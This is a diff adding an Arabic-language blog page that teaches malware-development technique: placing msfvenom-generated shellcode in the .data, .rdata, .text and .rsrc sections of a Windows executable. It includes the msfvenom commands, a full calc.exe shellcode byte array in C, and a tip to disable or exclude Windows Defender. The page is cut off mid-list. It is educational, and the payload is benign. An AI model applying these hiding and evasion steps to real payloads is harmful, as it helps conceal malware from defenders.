@@ -1,0 +1,908 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payload Placement</title>
+    <link rel="icon" href="../src/Pics/PayPlc.jpg" type="image/png">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet"
+        crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+    <style>
+        html,
+        body {
+            font-family: 'Cairo', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: black;
+            overflow-x: hidden;
+        }
+
+        nav {
+            width: 100%;
+            height: 10vh;
+            position: sticky;
+        }
+
+        .nav-container {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 2rem;
+            font-weight: bold;
+            cursor: pointer;
+            background: -webkit-linear-gradient(#16ff00, #ffed00);
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .logo span {
+            cursor: pointer;
+            background: -webkit-linear-gradient(#16ff00, #ffed00);
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .hamburg,
+        .cancel {
+            cursor: pointer;
+            position: absolute;
+            right: 15px;
+            top: 10px;
+            color: #16ff00;
+            display: none;
+            font-size: clamp(2.5rem, 0.5rem + 5vw, 3rem);
+        }
+
+        .nav-container .links {
+            display: flex;
+        }
+
+        .nav-container .links a {
+            font-size: 1.2rem;
+            color: white;
+            margin: 0 20px;
+            text-decoration: none;
+            font-weight: 550;
+            transition: 0.3s linear;
+        }
+
+        .nav-container .links a:hover {
+            color: #16ff00;
+            border-bottom: 2px solid #16ff00;
+        }
+
+        .dropdown {
+            max-height: 100vh;
+            overflow-y: auto;
+            z-index: 100;
+            position: absolute;
+            top: 0;
+            transform: translateY(-500px);
+            width: 100%;
+            height: auto;
+            backdrop-filter: blur(4px) brightness(40%);
+            box-shadow: 0 0 20px black;
+            transition: 0.2s linear;
+        }
+
+        .dropdown .links a {
+            display: flex;
+            color: white;
+            text-decoration: none;
+            padding: 15px 0;
+            justify-content: center;
+            align-items: center;
+            transition: 0.2s linear;
+        }
+
+        .dropdown .links a:hover {
+            background-color: #16ff00;
+            color: black;
+        }
+
+        .dark-mode {
+            background-color: #222;
+            color: #f4f4f4;
+        }
+
+        header {
+            background: -webkit-linear-gradient(#16ff00, #ffed00);
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-align: center;
+            border-bottom: 1px solid #16ff00;
+        }
+
+
+
+        header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 0 15px;
+        }
+
+
+        .article {
+            background: white;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .article h2 {
+            margin-top: 0;
+            border-top: 2px solid #16ff00;
+            border-bottom: 2px solid #16ff00;
+            padding-bottom: 5px;
+        }
+
+        .code-block {
+            background: #16ff00;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+            direction: ltr;
+            text-align: left;
+            font-size: 15px;
+        }
+
+
+        @media (max-width:884px) {
+            nav .logo {
+                position: absolute;
+                top: 16px;
+                left: 15px;
+                font-size: 1.5rem;
+            }
+
+            .nav-container .links {
+                display: none;
+            }
+
+            .hamburg,
+            .cancel {
+                display: block;
+            }
+
+        }
+
+
+        @media (max-width:440px) {
+            .nav-container {
+                margin-top: 10px;
+            }
+
+            table {
+                display: block;
+                overflow-x: auto;
+            }
+        }
+
+        .footer {
+            background: #111;
+            color: #fff;
+            text-align: center;
+            padding: 5px;
+            position: relative;
+            bottom: 0;
+            width: 100%;
+            margin-top: auto;
+        }
+
+        .footer a {
+            color: #16ff00;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .footer a:hover {
+            color: #35a849;
+        }
+
+        .ltr {
+            direction: ltr;
+            text-align: left;
+        }
+
+        .article-image {
+            width: 100%;
+            height: auto;
+            border-radius: 8px;
+        }
+
+        .nav-buttons a {
+            background: #16ff00;
+            color: black;
+            padding: 10px 0;
+            border-radius: 5px;
+            text-decoration: none;
+            transition: background-color 0.3s;
+            text-align: center;
+            flex: 1;
+            margin: 0 10px;
+            max-width: 150px;
+            font-size: 20px;
+        }
+
+        .nav-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+
+        .nav-buttons a:hover {
+            background: #35a849;
+        }
+
+        .download-link {
+            text-decoration: none;
+            color: #14aa2d;
+            font-weight: bold;
+            transition: color 0.3s ease;
+        }
+
+        .download-link:hover {
+            color: #16ff00;
+            text-decoration: underline;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 10px auto;
+            text-align: center;
+
+
+        }
+
+        th,
+        td {
+            border: 1px solid black;
+            padding: 7px;
+        }
+
+        th {
+            background-color: #16ff00;
+        }
+    </style>
+</head>
+
+<body>
+    <section>
+        <nav>
+            <div class="nav-container" style="direction: ltr;">
+                <div class="logo" data-aos="zoom-in" data-aos-duration="800">
+                    <span>0x4de1</span>
+                </div>
+                <div class="links">
+                    <div class="link" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100"><a
+                            href="https://0x4de1.github.io">Home</a></div>
+                    <div class="link" data-aos="fade-up" data-aos-duration="800" data-aos-delay="300"><a
+                            href="../MalDev.html">Mal Dev</a></div>
+                    <div class="link" data-aos="fade-up" data-aos-duration="800" data-aos-delay="400"><a
+                            href="https://0x4de1.medium.com/" id="blogLink">CTF Writeups</a></div>
+                </div>
+            </div>
+            <i class="fa-solid fa-bars hamburg" onclick="hamburg()"></i>
+            <div class="dropdown">
+                <div class="links">
+                    <a href="https://0x4de1.github.io">Home</a>
+                    <a href="../MalDev.html">Mal Dev</a>
+                    <a href="https://0x4de1.medium.com">CTF Writeups</a>
+                    <i class="fa-solid fa-xmark cancel" onclick="cancel()"></i>
+                </div>
+            </div>
+        </nav>
+        <header>
+            <h1 id="article-title" style="direction: ltr;">Payload Placement</h1>
+        </header>
+        <div class="container">
+            <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                <img src="../src/Pics/PayPlc.jpg" alt="HomeLab" class="article-image" loading="lazy">
+            </div>
+            <div class="article" data-aos="zoom-in" data-aos-duration="800">
+                <p style="text-align: center; font-weight: bold;">السَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ
+                </p>
+                <p style="text-align: center; font-weight: bold;">اللَّهُمَّ صَلِّ عَلَى مُحَمَّدٍ وَعَلَى آلِ
+                    مُحَمَّدٍ، كَمَا صَلَّيْتَ عَلَى إِبْرَاهِيمَ وَآلِ
+                    إِبْرَاهِيمَ، إِنَّكَ حَمِيدٌ مَجِيدٌ، وَبَارِكْ عَلَى مُحَمَّدٍ وَعَلَى آلِ مُحَمَّدٍ، كَمَا
+                    بَارَكْتَ عَلَى إِبْرَاهِيمَ وَآلِ إِبْرَاهِيمَ، إِنَّكَ حَمِيدٌ مَجِيدٌ،
+                </p>
+            </div>
+            <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                <h2>Introduction</h2>
+                <p>[+] في المقالة اللـ فاتت عرفنا عن ملفات الـ PE والهيكل بتاعها .. وتحديدا جزء الـ Sections ، وعرفنا
+                    وظيفة كل سيكشن إيه.</p>
+                <p>[+] فـ المقالة دي بقي ، هنتكلم عن لو معاك ShellCode ، إزاي تقدر تخليه يتنقل بين السكشنز فـ ملف الـ
+                    PE.</p>
+                <p>[+] وتحديدا هنتكلم عن:</p>
+                <ol style="font-weight: bold;">
+                    <li>Data Placement</li>
+                    <li>Rdata Placement</li>
+                    <li>Text Placement</li>
+                    <li>Rsrc Placement</li>
+                </ol>
+                <h2>تجهيز الـ ShellCode:</h2>
+                <p>[+] قبل مـ نبدأ محتاجين الأول نـ Generate الـ ShellCode اللـ هنشتغل بيه.</p>
+                <p>[+] هنروح ع الـ <code style="background: #16ff00; font-size: 14px;">Kali Linux machine</code> ، أو أي
+                    ماشين عندك عليها الـ <code style="background: #16ff00; font-size: 14px;">Metasploit</code> ،
+                    وهنستخدم تحديدا الـ
+                    <code style="background: #16ff00; font-size: 14px;">Msfvenom</code>.
+                </p>
+                <p>[+] هنـ رن الكوماند:</p>
+                <div class="code-block"><code>msfvenom -p windows/x64/exec CMD=calc.exe -f c</code></div>
+                <ul>
+                    <li>وشرح الكوماند بكل بساطه إنه هيعمل <code
+                            style="background: #16ff00; font-size: 14px;">شيل كود</code> وظيفته يفتح الـ <code
+                            style="background: #16ff00; font-size: 14px;">Calculator</code> ، والبايلود من نوع <code
+                            style="background: #16ff00; font-size: 14px;">exec</code>
+                        عشان ينفذ الكود من الـ <code style="background: #16ff00; font-size: 14px;">CMD</code> وع <code
+                            style="background: #16ff00; font-size: 14px;">ويندوز نظام الـ 64-bit</code> .. والـ f- دا
+                        بقوله إن الكود يكون مناسب لـ
+                        لغة <code style="background: #16ff00; font-size: 14px;">برمجة الـ C</code>.
+                        <code>(وطبعا تقدر تعمل الشيل كود اللـ انت عاوزه .. انا هنا عملت مجرد مثال بسيط لتوضيع الفكرة ، واللـ بعد كده إنت ودماغك)</code>
+                    </li>
+                </ul>
+                <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                    <img src="../src/Pics/ShellCode.png" alt="ShellCode" class="article-image" loading="lazy">
+                </div>
+                <p>وبكدا نكون جاهزين نبدأ.</p>
+                <h2>1. Data Placement:</h2>
+                <ol>
+                    <li>هنفتح الـ Visual Studio وهنكريت بروچيكت جديد وهنضيف الـ <code
+                            style="background: #16ff00; font-size: 14px;">main.c</code> اللـ هنكتب جواه الكود.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Data-Replc.png" alt="Data-Replc" class="article-image" loading="lazy">
+                    </div>
+                    <li>هنضيف المكتبات العادية الـ <code
+                            style="background: #16ff00; font-size: 14px;">&lt;windows.h&gt;</code> والـ <code
+                            style="background: #16ff00; font-size: 14px;">&lt;stdio.h&gt;</code> .. وهنضيف الشيل كود
+                        اللـ
+                        عملناه (انا بس
+                        غيرت الإسم من buf لـ OurShellCode).</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/ShellCode2.png" alt="ShellCode2" class="article-image" loading="lazy">
+                    </div>
+                    <li>هنكريت الـ <code style="background: #16ff00; font-size: 14px;">main function</code> ، ومثلا ممكن
+                        نطبع الـ address بتاع الشيل كود ده فين فـ الميموري ، وضيفت
+                        الـ ()getchar عشان البرنامج ميقفلش ويستني مني أضغط ع أي زرار.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/ShellCode3.png" alt="ShellCode3" class="article-image" loading="lazy">
+                    </div>
+                    <li>لو جربت تشغل البرنامج ، اللـ هيحصل إن هيطلعلك العنوان عادي جدا ، مفيش أكشن تاني هيحصل لا.
+                        (ملحوظة مهمه: ممكن البرنامج ميشتغلش عشان الـ <code
+                            style="background: #16ff00; font-size: 14px;">Windows Defender</code> هيمسكه ، يا توقفه يا
+                        تعمل للفولدر
+                        كله <code style="background: #16ff00; font-size: 14px;">exclusive</code>)</li>
+                    <li>ولو فاكر من أول مقالة كتبتها وتحديدا جزء الـ Memory Management .. كنا نقدر نوقف البرنامج وناخد
+                        العنوان نبحث بيه فـ الميموري .. جربها وهتلاقي الشيل كود.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/ShellCode4.png" alt="ShellCode4" class="article-image" loading="lazy">
+                    </div>
+                    <li>تعالي بقي نـ <code style="background: #16ff00; font-size: 14px;">Build</code> البروچيكت اللطيف
+                        ده ، وهنعمله ع نمط الـ Release ، ونشوف هل فعلا الشيل كود
+                        بتاعنا موجود فـ منطقة الـ <code style="background: #16ff00; font-size: 14px;">[Data.]</code> ولا
+                        لا.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/ShellCode5.png" alt="ShellCode5" class="article-image" loading="lazy">
+                    </div>
+                    <li>هنفتح الـ <a href="https://github.com/hasherezade/pe-bear/releases" target="_blank"
+                            class="download-link">PE-Bear</a> ونديله الملف ونحاول ندور فـ السكشنز ، هنلاقي إن فعليا
+                        الكود بتاعنا موجود فـ
+                        الـ <code style="background: #16ff00; font-size: 14px;">[Data.]</code> ، وعشان نتأكد إن هو فعلا
+                        ، إرجع للكود وشوف بداية ونهاية الشيل كود هتلاقيه البداية
+                        <code style="background: #16ff00; font-size: 14px;">0xFC4883</code> والنهاية <code
+                            style="background: #16ff00; font-size: 14px;">0x786500</code> .. يعني
+                        فعلا إحنا صح.
+                    </li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/ShellCode6.png" alt="ShellCode6" class="article-image" loading="lazy">
+                    </div>
+                </ol>
+                <p>[+] ودا كدا الكود النهائي للـ Data Placement:</p>
+                <div class="code-block"><code>
+                        #include &lt;Windows.h&gt;<br>
+                        #include &lt;stdio.h&gt;<br>
+                        <br>
+                        unsigned char OurShellCode[] =<br>
+                        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"<br>
+                        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"<br>
+                        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"<br>
+                        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"<br>
+                        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"<br>
+                        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"<br>
+                        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"<br>
+                        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"<br>
+                        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"<br>
+                        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"<br>
+                        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"<br>
+                        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"<br>
+                        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"<br>
+                        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"<br>
+                        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"<br>
+                        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"<br>
+                        "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"<br>
+                        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"<br>
+                        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"<br>
+                        "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";<br>
+                        <br>
+                        int main() {<br>
+                            &nbsp;&nbsp;printf("[-] ShellCode Address: 0x%p", OurShellCode);<br>
+                            &nbsp;&nbsp;getchar();<br><br>
+                            &nbsp;&nbsp;return 0; <br>
+                        }<br>
+                        
+                </code></div>
+                <br>
+                <h2>2. Rdata Placement</h2>
+                <p>[+] طب إيه الإختلاف اللـ هنعمله المرادي؟ مُجرد هنزود كلمة <code
+                        style="background: #16ff00; font-size: 14px;">const</code> فـ بداية الـ variable بتاع الشيل كود.
+                </p>
+                <ol>
+                    <li>هنبدأ بروچيكت جديد بنفس الخطوات اللـ فاتت ، وهنضيف نفس الكود اللـ فات كله.</li>
+                    <li>هنضيف كلمة <code style="background: #16ff00; font-size: 14px;">const</code>:</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/ShellCode7.png" alt="ShellCode7" class="article-image" loading="lazy">
+                    </div>
+                </ol>
+                <p style="font-weight: bold;">[+] بس كدا ؟ طب إزاي ؟؟</p>
+                <p>فكره منطقة الـ rdata إنها بتتعامل مع القيم الثابته ، فـ عشان ننقل الشيل كود من الـ data للـ rdata
+                    هنحتاج نعرفه إن المتغير اللـ عملناه ده ، مبقاش متغير ، قيمته بقت ثابته.</p>
+                <ul>
+                    <li>طب تعالي نتأكد هل الكلام ده صح ولا لا .. هنـ <code
+                            style="background: #16ff00; font-size: 14px;">Build</code> البروچيكت بنفس الطريقة اللـ فاتت.
+                    </li>
+                    <li>يلا ع الـ <a href="https://github.com/hasherezade/pe-bear/releases" target="_blank"
+                            class="download-link">PE-Bear</a> .. لا استني ، المرادي هنستخدم تول تانية عشان الـ <a
+                            href="https://github.com/hasherezade/pe-bear/releases" target="_blank"
+                            class="download-link">PE-Bear</a> محدوده شويتين فـ
+                        الداتا اللـ بتطلعها ، هنستخدم <a href="https://github.com/zodiacon/TotalPE2/releases"
+                            target="_blank" class="download-link">Total PE</a> .. إفتح البروجيكت ودور فـ السيكشنز ،
+                        هتلاقي الشيل كود
+                        فعليا فـ الـ [rdata.] .. يعني إحنا صح تاني.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/ShellCode8.png" alt="ShellCode8" class="article-image" loading="lazy">
+                    </div>
+                </ul>
+                <p>[+] ودا كدا الكود النهائي للـ Rdata Placement:</p>
+                <div class="code-block"><code>
+                        #include &lt;Windows.h&gt;<br>
+                        #include &lt;stdio.h&gt;<br>
+                        <br>
+                        const unsigned char OurShellCode[] =<br>
+                        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"<br>
+                        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"<br>
+                        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"<br>
+                        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"<br>
+                        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"<br>
+                        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"<br>
+                        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"<br>
+                        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"<br>
+                        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"<br>
+                        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"<br>
+                        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"<br>
+                        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"<br>
+                        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"<br>
+                        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"<br>
+                        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"<br>
+                        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"<br>
+                        "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"<br>
+                        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"<br>
+                        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"<br>
+                        "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";<br>
+                        <br>
+                        int main() {<br>
+                            &nbsp;&nbsp;printf("[-] ShellCode Address: 0x%p", OurShellCode);<br>
+                            &nbsp;&nbsp;getchar();<br><br>
+                            &nbsp;&nbsp;return 0; <br>
+                        }<br>
+                        
+                </code></div>
+                <br>
+                <h2>3. Text Placement</h2>
+                <p style="font-weight: bold;">[+] هنغير إيه بقي المرادي؟ </p>
+                <p>بُص يسيدي ، مجرد هتضيف سطرين صغيرين بس وهما:</p>
+                <div class="code-block">
+                    <code>
+                        #pragma section(".text")<br>
+                        __declspec(allocate(".text"))
+                    </code>
+                </div>
+                <p>[+] ودي هتجبر الـ compiler إنه ياخد الداتا دي ويحطها فـ سكشن الـ [text.].</p>
+                <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                    <img src="../src/Pics/ShellCode9.png" alt="ShellCode9" class="article-image" loading="lazy">
+                </div>
+                <ul>
+                    <li>يلا بيناا نتأكد .. هنـ Build .. وع الـ <a href="https://github.com/zodiacon/TotalPE2/releases"
+                            target="_blank" class="download-link">Total PE</a> ، هنلاقي إن فعلا الشيل كود موجود فـ منطقة
+                        الـ
+                        [.text]</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/ShellCode10.png" alt="ShellCode10" class="article-image" loading="lazy">
+                    </div>
+                    <li>ولو جربت المرادي ع الـ <a href="https://github.com/hasherezade/pe-bear/releases" target="_blank"
+                            class="download-link">PE-Bear</a> هيطلعلك نفس النتيجة:</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/ShellCode11.png" alt="ShellCode11" class="article-image" loading="lazy">
+                    </div>
+                </ul>
+                <p>[+] ودا كدا الكود النهائي للـ Text Placement:</p>
+                <div class="code-block"><code>
+                        #include &lt;Windows.h&gt;<br>
+                        #include &lt;stdio.h&gt;<br>
+                        <br>
+                        #pragma section(".text")<br>
+                        __declspec(allocate(".text")) const unsigned char OurShellCode[] =<br>
+                        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"<br>
+                        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"<br>
+                        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"<br>
+                        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"<br>
+                        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"<br>
+                        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"<br>
+                        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"<br>
+                        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"<br>
+                        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"<br>
+                        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"<br>
+                        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"<br>
+                        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"<br>
+                        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"<br>
+                        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"<br>
+                        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"<br>
+                        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"<br>
+                        "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"<br>
+                        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"<br>
+                        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"<br>
+                        "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";<br>
+                        <br>
+                        int main() {<br>
+                            &nbsp;&nbsp;printf("[-] ShellCode Address: 0x%p", OurShellCode);<br>
+                            &nbsp;&nbsp;getchar();<br><br>
+                            &nbsp;&nbsp;return 0; <br>
+                        }<br>
+                        
+                </code></div>
+                <br>
+                <h2>4. Rsrc Placement</h2>
+                <p>[+] هنا بقي وصلنا للـ Big Boss ، المنطقة اللـ أغلبية الهكرز الجامدين بيحطوا أي شيل كود تبهم هنا .. طب
+                    ليه المنطقة دي تحديدا ؟ هقولك فـ اخر المقالة.</p>
+                [+] بس فـ مشكلة حاليا ، المنطقة دي بيكون فيها الصور والأيقونات اللـ تبع أي برنامج .. إزاي هنضيف هنا
+                الشيل كود؟
+                <p style="font-weight: bold;">تعالي بقي نبدأ الحدوته:</p>
+                <p>عشان نعمل ده ، محتاجين نرجع للـ <code
+                        style="background: #16ff00; font-size: 14px;">Kali Linux machine</code> ، ونخلي الـ <code
+                        style="background: #16ff00; font-size: 14px;">Msfvenom</code> تعمل نفس الشيل كود ، بس
+                    المرادي تخليه فـ أيقونه ، من خلال الكوماند ده:</p>
+                <div class="code-block"><code>msfvenom -p windows/x64/exec CMD=calc.exe -o calc.ico</code></div>
+                <ul>
+                    <li>والإختلاف هنا إني خليت الـ Output يكون جوا أيقونة.</li>
+                </ul>
+                <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                    <img src="../src/Pics/Rsrc-Plc.png" alt="Rsrc-Placement" class="article-image" loading="lazy">
+                </div>
+                <p style="font-weight: bold;">[+] تعالي أقولك إزاي هنضيف الأيقونه دي جوا الـ Visual Studio:</p>
+                <ol>
+                    <li>هتفتح الـ Visual Studio وتعمل بروجيكت جديد ، وتضيف الـ <code
+                            style="background: #16ff00; font-size: 14px;">main.c</code>:</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Rsrc-Plc2.png" alt="Rsrc-Placement2" class="article-image" loading="lazy">
+                    </div>
+                    <li>هتضيف الشيل كود بتاعنا فـ المسار بتاع البرجيكت اللـ شغالين عليه حاليا .. بالنسبالي هو فـ المسار
+                        ده:</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Rsrc-Plc3.png" alt="Rsrc-Placement3" class="article-image" loading="lazy">
+                    </div>
+                    <li>هنروح لمنطقة الـ Resource Files وبعدين <code
+                            style="background: #16ff00; font-size: 14px;">Right-click > add > New item > Show All Temples > Resource > Resource File > Add</code>.
+                    </li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Rsrc-Plc4.png" alt="Rsrc-Placement4" class="article-image" loading="lazy">
+                    </div>
+                    <li>بعد كدا هيظهر منطقة الأيقونات ، هتعمل <code
+                            style="background: #16ff00; font-size: 14px;">Right-click > Add Resource > Import > All Files (*.*) > choose calc.ico > OPEN_EXISTING</code>
+                    </li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Rsrc-Plc5.png" alt="Rsrc-Placement5" class="article-image" loading="lazy">
+                    </div>
+                    <li>هتكتب نوع الـ Reasource ان دا RsrcData (أوأي إسم زي مـ تحب) ، وبكدا الأيقونه هتظهرلك بكل
+                        محتواها.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Rsrc-Plc6.png" alt="Rsrc-Placement6" class="article-image" loading="lazy">
+                    </div>
+                    <li>بعدين ارجع للـ <code style="background: #16ff00; font-size: 14px;">main.c</code> ، واقفل الـ
+                        <code style="background: #16ff00; font-size: 14px;">Resource View</code> .. هتلاقي إن انضاف جزء
+                        جديد اسمه <code style="background: #16ff00; font-size: 14px;">Resource.h</code> ..
+                        هتضيفه فـ الكود بالشكل ده:
+                    </li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Rsrc-Plc7.png" alt="Rsrc-Placement7" class="article-image" loading="lazy">
+                    </div>
+                </ol>
+                <p style="border-top: 2px solid #16ff00;"></p>
+
+                <p style="font-weight: bold;">[+] وبكدا تكون جاهز ، ومن أول هنا هنبدأ نكتب الكود ، بس قبل مـ أشرحلك
+                    الكود .. هقولك نظرة سريعة ع إيه الحاجات اللـ هنستخدمها وبتعمل إيه:</p>
+                <ol>
+                    <li>أول حاجه هنحتاج نعرف الأيقونه دي مكانها فين ، عشان كدا أول عملية هنستخدمها هي الـ
+                        <code style="background: #16ff00; font-size: 14px;">()FindResourceW</code> ، ودي دورها إنها
+                        بتدور جوا الـ Resources ع ملف معين.
+                    </li>
+                    <li>دلوقتي عرفنا المكان .. محتاجين بقي نعرف حجمها قد ايه .. وهنستخدم <code
+                            style="background: #16ff00; font-size: 14px;">()SizeofResource</code>.</li>
+                    <li>بعد كدا هنحتاج نحمل الأيقونة دي فـ الميموري .. وهنستخدم <code
